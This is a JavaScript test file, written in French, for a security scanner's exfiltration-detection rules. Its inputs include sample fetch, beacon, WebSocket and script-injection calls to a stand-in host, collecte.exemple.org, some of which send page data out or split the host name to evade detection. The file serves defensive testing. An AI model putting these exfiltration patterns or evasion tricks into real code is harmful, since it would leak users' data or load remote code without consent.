import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyserSortiesReseau, analyserScriptDynamique } from '../src/regles/c-securite.js';

/**
 * Une destination assemblée par concaténation de littéraux est l'adresse qu'elle écrit : elle
 * ne note jamais mieux que la même adresse en clair. Une adresse dont une partie est calculée
 * reste une destination calculée (C-EXFIL-02, majeur à vérifier) : c'est l'axe D qui l'observe.
 */

function ctxDe(contenu) {
  return { fichiers: [{ chemin: 'app.js', contenu, lignes: contenu.split('\n'), ext: '.js', binaire: false, executee: true, vendorise: false }] };
}

// Ce que l'axe C dit d'une destination : « règle/sévérité/bloquant », hôte compris.
function verdict(analyse, code) {
  const constats = analyse(ctxDe(code));
  assert.ok(constats.length <= 1, `au plus un constat attendu pour ${code}`);
  const c = constats[0];
  return c ? `${c.regle} ${c.severite}${c.bloquant ? '+bloquant' : ''} ${c.titre.split(' : ').pop()}` : 'rien';
}
const reseau = (code) => verdict(analyserSortiesReseau, code);

test('une concaténation de littéraux vaut l\'adresse en clair, sur chaque canal réseau', () => {
  const canaux = [
    "fetch('https://collecte.exemple.org/api')",
    "xhr.open('POST', 'https://collecte.exemple.org/api')",
    "navigator.sendBeacon('https://collecte.exemple.org/api', 'x')",
    "new WebSocket('wss://collecte.exemple.org')",
    "importScripts('https://collecte.exemple.org/w.js')",
    "import('https://collecte.exemple.org/m.js')",
  ];
  for (const clair of canaux) {
    assert.equal(reseau(clair.replace('collecte.exemple', "coll' + 'ecte.exem' + 'ple")), reseau(clair), clair);
    assert.match(reseau(clair), /^C-EXFIL-01 critique\+bloquant collecte\.exemple\.org$/, clair);
  }
});

test("une adresse dont une partie est calculée reste une destination calculée, que l'axe D tranche", () => {
  for (const code of ["fetch('https://collecte.exemple.org/api?d=' + encodeURIComponent(document.title))", 'fetch(`https://collecte.exemple.org/${nom}`)', "fetch('https://' + document.title + '/api')", 'fetch(adresse)']) {
    assert.match(reseau(code), /^C-EXFIL-02 majeur /, code);
  }
});

test("l'API Grist officielle et le local ne sont pas des destinations externes, concaténées ou non", () => {
  assert.equal(reseau("fetch('https://docs.getgrist' + '.com/api/docs/x')"), 'rien');
  assert.equal(reseau("fetch('./data' + '.json')"), 'rien');
  assert.equal(reseau("fetch('http://local' + 'host:8080/x')"), 'rien');
});

test('C-EXFIL-05 : un <script> créé avec une adresse assemblée par concaténation de littéraux est vu comme en clair', () => {
  const code = (src) => `const s = document.createElement('script');\ns.src = ${src};\ndocument.head.appendChild(s);`;
  const clair = verdict(analyserScriptDynamique, code("'https://collecte.exemple.org/x.js'"));
  assert.equal(clair, 'C-EXFIL-05 critique+bloquant collecte.exemple.org');
  assert.equal(verdict(analyserScriptDynamique, code("'https://coll' + 'ecte.exemple.org/x.js'")), clair);
});
